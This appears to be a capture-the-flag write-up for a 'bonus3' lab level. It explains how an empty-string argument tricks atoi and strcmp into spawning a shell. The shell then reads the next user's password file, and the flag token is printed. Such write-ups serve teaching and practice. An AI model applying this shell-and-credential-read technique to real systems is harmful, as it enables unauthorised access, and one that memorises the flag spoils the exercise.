# bonus3

## Header

```bash
ssh bonus3@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
```

<hr>

## Solution

Look at these lines:
```c
  ...
  if (!strcmp(buf, av[1])) {
        execl("/bin/sh", "sh", NULL);
  ...
```

Here, we understand that `/bin/sh` will be executed only if `buf` will be equal to `av[1]`.
As for `buf`, it is filled with the token of `end` user.
```c
    file = fopen("/home/user/end/.pass", "r");
    ...
    fread(buf, 1, 66, file);
    buf[65] = '\0';

    *(buf + atoi(av[1])) = '\0';
    
    fread(&buf[66], 1, 65, file);
```

To solve this puzzle, we need to pass empty string as a parameter, that will be parsed by `atoi` as 0 and terminated null will be placed at the beginning of the `buf` that made `buf` equal to empty string.

```bash
./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
## References
